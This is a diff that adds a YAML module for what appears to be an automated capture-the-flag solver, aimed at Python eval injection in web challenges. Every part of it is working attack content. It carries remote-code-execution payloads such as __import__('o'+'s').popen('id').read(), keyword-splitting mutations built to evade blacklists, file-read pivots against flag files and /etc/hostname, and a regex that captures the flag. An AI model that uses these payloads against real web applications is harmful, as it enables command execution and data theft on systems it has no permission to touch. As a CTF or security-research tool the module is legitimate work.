@@ -1,0 +1,82 @@
+id: web_eval_injection
+name: Eval Injection
+category: web
+version: "1.0"
+author: lattice-mind
+description: Detects eval-expression execution and pivots through blacklist-aware payload variants.
+enabled: true
+tags:
+  - eval
+  - rce
+  - python
+depends_on: []
+estimated_duration_seconds: 20
+applies_when:
+  - "context.challenge.type == 'web'"
+min_confidence: 0.05
+stop_on_flag: true
+
+confidence_seeds:
+  - condition: "any('python' in t for t in context.tech_stack)"
+    boost: 0.20
+    label: python_stack
+  - condition: "any('/calc' in p or '/loan' in p for p in context.found_paths)"
+    boost: 0.15
+    label: calculator_path_hint
+
+detection_paths:
+  - id: detect_eval_math
+    name: Eval arithmetic probe
+    description: Validate expression execution by sending arithmetic payload.
+    min_confidence: 0.05
+    steps:
+      - id: eval_probe_math
+        action: http_request
+        with:
+          method: GET
+          request_source: forms
+          inject_into: all_params
+          payloads:
+            - "7*6"
+            - "__import__('o'+'s').popen('id').read()"
+            - "str(9*9)"
+          mutation_families:
+            - split_keyword
+            - whitespace_tweak
+            - quote_flip
+          max_variants: 8
+        signals:
+          - name: eval_exec_observed
+            match: "uid=|\\b42\\b|\\b81\\b"
+            on_match:
+              emit: eval_exec_observed
+              confidence_boost: 0.35
+          - name: blacklist_detected
+            match: "forbidden keyword"
+            on_match:
+              emit: blacklist_detected
+              confidence_boost: 0.20
+
+exploitation_paths:
+  - id: exploit_eval_file_read
+    name: Eval file-read pivot
+    requires_signal: eval_exec_observed
+    technique: python_eval_rce
+    steps:
+      - id: eval_exfil_attempt
+        action: http_request
+        with:
+          method: GET
+          request_source: forms
+          inject_into: vulnerable_param
+          payloads:
+            - "__import__('o'+'s').popen('nl /f*').read()"
+            - "__import__('o'+'s').popen('id').read()"
+            - "getattr(__builtins__,'o'+'pen')('/etc/hostname').read()"
+          mutation_families:
+            - split_keyword
+            - quote_flip
+          max_variants: 10
+        capture:
+          - as: flag_value
+            pattern: "(picoCTF\\{[^}]+\\}|flag\\{[^}]+\\}|ctf\\{[^}]+\\})"
